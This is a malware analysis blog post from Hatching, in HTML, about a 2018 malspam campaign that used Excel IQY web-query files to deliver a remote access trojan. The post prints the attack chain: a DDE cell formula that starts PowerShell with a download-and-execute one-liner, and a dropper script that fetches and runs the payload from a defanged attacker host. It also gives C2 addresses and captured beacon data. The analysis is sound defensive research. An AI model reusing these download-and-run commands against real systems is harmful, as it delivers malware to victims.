@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="robots" content="index, follow">
+    <meta name="description" content="Automated malware analysis with Hatching Triage, the high-volume sandbox solution for SOCs, CERTs, SOARs, and MSSPs.">
+    <meta name="keywords" content="Hatching, Hatching Triage, Sandbox, Malware Analysis, Automated Malware Analysis">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
+    <meta name="revisit-after" content="3 days">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@hatching_io">
+    <meta name="twitter:title" content="Hatching - Automated malware analysis solutions">
+    <meta property="og:title" content="Hatching - Automated malware analysis solutions">
+    <meta property="og:description" content="Automated malware analysis with Hatching Triage, the high-volume sandbox solution for SOCs, CERTs, SOARs, and MSSPs.">
+    <meta property="og:url" content="https://www.hatching.io">
+    <link rel="manifest" href="/static/manifest.json">
+    
+      <meta property="og:image" content="https://www.hatching.io/static/images/backgrounds/resized-3.jpg">
+      <meta name="twitter:image" content="https://www.hatching.io/static/images/backgrounds/resized-3.jpg">
+    
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-123677703-1"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'UA-123677703-1');
+    </script>
+    <link rel="stylesheet" href="https://hatching.io/static/css/index.css?1726233262">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://hatching.io/static/images/favicon-32x32.png?v=21">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://hatching.io/static/images/favicon-16x16.png?v=21">
+    <title>IQY malspam campaign</title>
+  </head>
+  <body>
+<nav class="site-menu">
+  <ul>
+    <li><a href="/">Home</a></li>
+    <li><a href="/about/">About</a></li>
+    <li><a href="/triage/">Triage</a></li>
+    <li><a class="active" href="/blog/">Blog</a></li>
+    <li><a  href="https://boards.greenhouse.io/recordedfuture" rel="nofollow">Jobs</a></li>
+    <li><a href="https://go.recordedfuture.com/enterprise-sandbox-contact-us" target="_blank">Contact</a></li>
+  </ul>
+</nav>
+<header class="site-nav headroom theme-light">
+  <div class="logo">
+    <a href="/">
+      <img width="210px" src="https://hatching.io/static/images/rf-hatching-black.svg" width="164">
+    </a>
+  </div>
+  <div>
+    <a href="#" class="toggle-menu">
+      Menu
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+  </div>
+</header>
+
+
+<section class="scheme-1 view-context blog-fold blog-article-head" id="fold" data-keep="true">
+  <div class="view-context__body">
+    <div>
+      <div>
+        
+        <h2>IQY malspam campaign</h2>
+      </div>
+      <ul>
+        <li>Share this:</li>
+        <li class="social">
+          <a href="https://twitter.com/hatching_io" target="_blank">
+            <i class="icon-twitter"></i>
+          </a>
+          <a href="https://www.linkedin.com/company/hatching" target="_blank">
+            <i class="icon-linkedin"></i>
+          </a>
+          <a href="https://www.github.com/hatching" target="_blank">
+            <i class="icon-github"></i>
+          </a>
+        </li>
+      </ul>
+    </div>
+    <div>
+      <h1>Blog.</h1>
+    </div>
+  </div>
+  <div class="background-graphic">
+    
+      <div class="image" style="background-image: url('/static/images/backgrounds/resized-3.jpg');"></div>
+    
+  </div>
+</section>
+
+<article class="view-context blog-article">
+  <header class="blog-article-meta">
+    <div class="blog-article-general">
+      <p><time datetime="2018-10-15T00:00:00Z">2018-10-15</time></p>
+        
+          <ul class="blog-article-tags">
+            <li><p><a href="/blog/#category=blogpost">blogpost</a></p><li><p><a href="/blog/#category=hooking">hooking</a></p><li><p><a href="/blog/#category=monitor">monitor</a></p>
+          </ul>
+        
+    </div>
+    <div class="blog-article-author">
+      <div class="avatar">
+        <img src="/static/images/avatars/alwin.svg" />
+      </div>
+      <div>
+        <h5>Written by <br />Alwin Peppels</h5>
+      </div>
+    </div>
+  </header>
+  <section class="blog-article-body">
+    
+      <h2 id="overview">Overview</h2>
+<p>We have observed samples from a malspam campaign using IQY files as the
+delivery mechanism.  These simple text files are Excel Web Query files used to
+load a web resource into Excel.  This sample loads a query that leverages DDE
+and PowerShell to download and run a RAT.</p>
+<p>These samples were observed at the beginning of last August. It took a few
+weeks to get this blogpost published due to our website getting an overhaul.
+However we are still seeing IQY files being used as a delivery mechanism today,
+so we hope this analysis still proves useful.</p>
+<figure><img src="../../static/images/blog/iqy-malspam/process_tree1.png"><figcaption>
+      <h4>Process tree</h4>
+    </figcaption>
+</figure>
+
+<p>The IQY sample we will be analyzing retrieves its stages and final payload from rx53.com.
+We have also observed IQY files loading this payload from the domain i86h.com.
+The timestamp suggests this payload was created August 9th.</p>
+<p>Online evidence suggests these domains are related to t69c.com, which is confirmed to be
+using the same technique to spread a FlawedAmmyy RAT (timestamped July 17th).</p>
+<p>All these domains were registered at imena.ua, a Kyiv-based registrar on the days their respective payloads were compiled.</p>
+<p>The payload from August 9th is signed using a Thawte code signing certificate that is registered to a legitimate company and is probably stolen. The previous FlawedAmmyy RAT
+was not signed.</p>
+<h2 id="delivery">Delivery</h2>
+<p>Here we see the contents of the .iqy file, and see it is just a simple text file containing a URL; PIC88224.iqy:</p>
+<pre><code>WEB
+1
+hxxp://r53x.com/1.rar
+2
+3
+4
+5
+</code></pre>
+<p>Besides PIC88224.iqy, this sample is also known as &ldquo;Receipt of payment 10-08-2018.iqy&rdquo;.
+Some other occurrences had the extension changed to .zip to make the URL look more legitimate.</p>
+<p>The IQY format is very simple, using a URL to point to an online resource that
+should fill the cell, <code>hxxp://r53x.com/1.rar</code>. This generates an Excel prompt
+about blocked data connections:</p>
+<figure><img src="../../static/images/blog/iqy-malspam/excel_screenshot1_crop.png">
+</figure>
+
+<p>The IQY file is also identified as suspicious by Cuckoo because it contains a URL:</p>
+<figure><img src="../../static/images/blog/iqy-malspam/excel_sig1.png">
+</figure>
+
+<p>While the path in the URL has the extension .rar to make it look more
+legitimate, it actually is an Excel query that runs system commands. But since
+Excel only uses the content of the response the extension will not cause any
+trouble.</p>
+<p>1.rar</p>
+<pre><code>=cmd|' /c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop
+-c IEX ((new-object net.webclient).downloadstring(\&quot;hxxp://r53x.com/1.zip\&quot;))'!A0
+</code></pre>
+<p>In the query, the attacker has leveraged the workings of Dynamic Data Exchange
+(DDE) within Excel to execute system commands from a cell in the workbook. This
+generates a prompt about the workbook trying to start an external application.</p>
+<figure><img src="../../static/images/blog/iqy-malspam/excel_screenshot3_crop.png">
+</figure>
+
+<p>More info about this technique can be found here:
+<a href="https://www.contextis.com/blog/comma-separated-vulnerabilities">https://www.contextis.com/blog/comma-separated-vulnerabilities</a></p>
+<p>This DDE query retrieves the actual snippet of PowerShell to run from
+<code>hxxp://r53x.com/1.zip</code>, and uses it as an argument to the PowerShell process:</p>
+<pre><code>$bigs = &quot;hxxp://r53x.com/a3.dat&quot;,&quot;&quot;
+foreach($big in $bigs){
+Try
+{
+    Write-Host $big
+    $tp = &quot;$env:temp\cmd_.exe&quot;
+    Write-Host $tp
+    $wc = New-Object System.Net.WebClient
+    $wc.DownloadFile($big, $tp)
+    Start-Process $tp
+    break
+}
+Catch
+{
+   Write-Host $_.Exception.Message
+}
+}
+</code></pre>
+<p>Again, the filename on the server does not matter, only the content of the
+response is used by default. This second piece of PowerShell retrieves the
+final payload at <code>hxxp://r53x.com/a3.dat</code>, saves it as <em>cmd_.exe</em>, and runs it:</p>
+<figure><img src="../../static/images/blog/iqy-malspam/martian_sig1.png">
+</figure>
+
+<figure><img src="../../static/images/blog/iqy-malspam/ps_dl_sig1.png">
+</figure>
+
+<figure><img src="../../static/images/blog/iqy-malspam/ps_dropper_sig1.png">
+</figure>
+
+<p>This is a RAT that communicates using encrypted data which is subsequently base64-encoded. This is done with a set of seemingly hijacked servers that serve as Command and Control hosts. This sample is well-detected as a generic Trojan:
+<a href="https://www.virustotal.com/#/file/bc1fc69f9747dc034ece7d9bb795c5e596d9be6ca71efe75c6c0fd18f3cbfbf5/detection">https://www.virustotal.com/#/file/bc1fc69f9747dc034ece7d9bb795c5e596d9be6ca71efe75c6c0fd18f3cbfbf5/detection</a></p>
+<figure><img src="../../static/images/blog/iqy-malspam/vt_screenshot1.png">
+</figure>
+
+<p>The old payload served from the now-offline t69c.com domain was the FlawedAmmyy
+RAT, identifiable amongst other characteristics by its communications starting
+with an &ldquo;=&rdquo; sign.
+<a href="https://www.virustotal.com/#/file/c2080983598643a2498d1f6ef3f1cc9dc58a784a69e3f313f18dc1b8e0afbc17/detection">https://www.virustotal.com/#/file/c2080983598643a2498d1f6ef3f1cc9dc58a784a69e3f313f18dc1b8e0afbc17/detection</a></p>
+<p>The new payload uses base64-encoded encrypted binary data for its
+communication.  C&amp;C traffic is encrypted and decrypted with the CryptEncrypt
+and CryptDecrypt WinAPI calls. This allows us to recover the plaintext with
+Cuckoo Sandbox, which logs these calls, along with the buffers going in and out
+of them.  Here we see what appears like the encrypting and sending of a ping
+message back to the C&amp;C server.</p>
+<h2 id="communication">Communication</h2>
+<p>The new payload uses base64-encoded encrypted binary data for its communication.
+C&amp;C traffic is encrypted and decrypted with the CryptEncrypt and CryptDecrypt WinAPI calls. This allows us to recover the plaintext with Cuckoo Sandbox, which logs these calls, along with the buffers going in and out of them.
+Here we see what appears like the encrypting and sending of a ping message back to the C&amp;C server.</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">CryptEncrypt</th>
+          <th style="text-align: left"></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">buffer</td>
+          <td style="text-align: left">7bede79597c6011d|0|0</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">key handle</td>
+          <td style="text-align: left">0x00598048</td>
+      </tr>
+  </tbody>
+</table>
+<p>CryptEncrypt is followed by WSASend messaging the data home:</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">WSASend</th>
+          <th style="text-align: left"></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">buffer</td>
+          <td style="text-align: left">param=UMipm9e28xgzsJu7CdATYdny%2B7dR</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left">gZWeQpmP5N4vjQRlFnkZlNCTBqSobObzovqO</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">socket</td>
+          <td style="text-align: left">628</td>
+      </tr>
+  </tbody>
+</table>
+<p>Here we see the RAT decrypting a list of recieved C&amp;C servers.</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">CryptDecrypt</th>
+          <th style="text-align: left"></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">buffer</td>
+          <td style="text-align: left">15|1|hxxp://185.68.93.18/dot.php|hxxp://94.103.81.71/dot.php</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">key handle</td>
+          <td style="text-align: left">0x00598048</td>
+      </tr>
+  </tbody>
+</table>
+<p>&hellip;and it sending back an infection report, containing a unique ID, the Windows
+version, the Username, the IP address, amongst other data.</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">CryptEncrypt</th>
+          <th style="text-align: left"></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">buffer</td>
+          <td style="text-align: left">7bede79597c6011d|1|955|1|0|1|0|192.168.58.18#Administrator#</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left">#shGcXgbX#2#2#1.0#6.1.7601# # #1# #en#0#US#hxxp://185.68.93.18/</td>
+      </tr>
+      <tr>
+          <td style="text-align: left"></td>
+          <td style="text-align: left">dot.php#hxxp://94.103.81.71/dot.php#hxxp://89.223.92.202/dot.php#15</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">key handle</td>
+          <td style="text-align: left">0x00598048</td>
+      </tr>
+  </tbody>
+</table>
+<p>The new payload gets C&amp;C IPs that are (thus far) registered with WHOIS
+information pointing to different legitimate businesses in the Russian
+Federation. These look like compromised servers, and suggest a large part of
+this campaign is built on hijacked infrastructure.</p>
+<h2 id="code-signing">Code Signing</h2>
+<p>The final payload is signed using a Thawte code signing certificate that is registered to CINECTIC LIMITED, which looks to be stolen since Cinectic is a legitimate business:</p>
+<pre><code>$ osslsigncode verify r53x.com/a3.dat
+    --snip--
+    Signature verification: ok
+    Number of signers: 1
+    Signer #0:
+    Subject: /C=GB/ST=Surrey/L=Cobham/O=CINECTIC LIMITED/CN=CINECTIC LIMITED
+    Issuer : /C=US/O=thawte, Inc./CN=thawte SHA256 Code Signing CA
+</code></pre>
+<p>A company with the same name can be seen as registered in Cobham, Surrey:</p>
+<figure><img src="../../static/images/blog/iqy-malspam/cert_screenshot.png">
+</figure>
+
+<p>The FlawedAmmyy RAT however, does not have a code signing certificate:</p>
+<pre><code>$ osslsigncode verify t69c.com/donate
+    Current PE checksum   : 00000000
+    Calculated PE checksum: 000AD915
+    No signature found.
+</code></pre>
+<h2 id="conclusion">Conclusion</h2>
+<p>The IQY attack vector is a nifty way of leveraging native functionalities. The
+advantage of using those is that it blends into legitimate traffic; being
+aggressive in blocking IQY files might interfere with legitimate processes, and
+Excel might be a trusted application. The trade-off is that it requires more
+user interaction to reach the final payload. The developers of Excel could see
+enough risk here to at least include a prompt or two, so the danger might very
+well be spotted by a security-conscious user. But the issue for automated
+security products is that these IQY files are simple text files, shifting the
+problem for static engines to &ldquo;is the URL contained in this file known to be
+malicious?&rdquo;. This presents a problem because domains are quite disposable.</p>
+<p>However, the full consequences of opening this file quickly become clear when
+the sample is ran through a dynamic analysis engine like Cuckoo Sandbox or
+<a href="https://hatching.io/solutions">Hatching Triage</a>. Allowing the rest of the stages to load and execute
+provides a representative picture of infections that use multiple stages,
+betraying that the process structure caused by opening this file is highly
+irregular. In this case the analysis is aided by the intermediate stages
+lacking obfuscation and using common methods of execution. Moreover, plaintext
+C&amp;C traffic can easily be looked up in the final report. This is in part
+because the final payload is not using an internal library for cryptography.
+Instead it relies on encryption functionality provided by the operating system.
+This forces the sample to send the data it wants to hide through API calls of
+which the contents are trivially captured.</p>
+
+    
+  </section>
+</article>
+
+
+<section class="view-context blog-recommendations">
+  <article class="view-context__body">
+    <h2>You may also like:</h2>
+    
+    <ul>
+      
+        <li>
+          <h3>Triage Thursday Ep. 84</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/tt-2022-08-18/">Read</a>
+        </li>
+      
+        <li>
+          <h3>Triage Thursday Ep. 96</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/tt-2023-08-17/">Read</a>
+        </li>
+      
+        <li>
+          <h3>Ep. 111: Support for Windows 11 &amp; Android 13</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/tt-2023-11-30/">Read</a>
+        </li>
+      
+        <li>
+          <h3>New Warzone Extractor and Family Updates</h3>
+          <br>
+          <a class="button button-variant-3" href="https://hatching.io/blog/tt-2021-02-18/">Read</a>
+        </li>
+      
+    </ul>
+  </article>
+</section>
+    <footer class="scheme-4 view-context footer" id="contact">
+      <article class="view-context__body">
+        <h2>Want to know more?<br />Get in touch!</h2>
+        <a class="button button-variant-1" target="_blank" href="https://go.recordedfuture.com/enterprise-sandbox-contact-us" i>Contact us</a>
+        <ul>
+          <li>
+            <ul>
+              <li class="logo"><img src="https://hatching.io/static/images/rf-hatching-white.svg" alt="hatching"/></li>
+              <li class="social">
+                <a href="https://twitter.com/hatching_io" target="_blank">
+                  <i class="icon-twitter"></i>
+                </a>
+                <a href="https://www.linkedin.com/company/hatching" target="_blank">
+                  <i class="icon-linkedin"></i>
+                </a>
+                <a href="https://www.github.com/hatching" target="_blank">
+                  <i class="icon-github"></i>
+                </a>
+              </li>
+            </ul>
+          </li>
+          <li>
+            Hatching International B.V.<br />
+            The Netherlands<br/>
+            <br />
+            Email us: <a href="mailto:info@hatching.io">info@hatching.io</a>
+          </li>
+          <li>
+            IBAN: NL52 INGB 0006 9672 73<br />
+            BIC: INGBNL2A<br />
+            ING Groep N.V.<br />
+            Amsterdam-Zuidoost<br />
+            <br />
+            REG: 64146707<br />
+            VAT: NL855541891B01
+          </li>
+        </ul>
+      </article>
+      <div class="form hidden">
+        <div class="form-logo">
+          <img src="https://hatching.io/static/images/rf-hatching-white.svg" alt="Hatching"/>
+        </div>
+        <a href="#" class="form-close" title="Close (or press esc)"></a>
+
+        <div class="container">
+          <h1>Contact us</h1>
+          <h3>Feel free to inquire or request about our services.</h3>
+          <form>
+            <fieldset>
+              <div class="field">
+                <div class="input is-required">
+                  <input id="form-name" name="name" placeholder="Name" />
+                </div>
+              </div>
+              <div class="field">
+                <div class="input is-required">
+                  <input id="form-email" name="email" placeholder="Email" />
+                </div>
+              </div>
+              <div class="field">
+                <div class="input">
+                  <input id="form-phone" name="phone" placeholder="Phone number" />
+                </div>
+              </div>
+              <div class="field">
+                <div class="input">
+                  <input id="form-company" name="company" placeholder="Company" />
+                </div>
+              </div>
+            </fieldset>
+            <fieldset>
+              <div class="input required">
+                <textarea id="form-message" name="message" placeholder="Write a message"></textarea>
+              </div>
+              <div class="button-group">
+                <button type="reset" class="button button-variant-2 button-transparent">Reset</button>
+                <button type="submit" class="button button-variant-1">Send</button>
+              </div>
+            </fieldset>
+          </form>
+        </div>
+
+      </div>
+    </footer>
+    <script src="https://hatching.io/static/js/hatching.js?1726233262"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+          if(window.main && window.main instanceof Function) {
+            window.main();
+          }
+          initForm();
+
+          
+          
+        });
+    </script>
+  </body>
+</html>
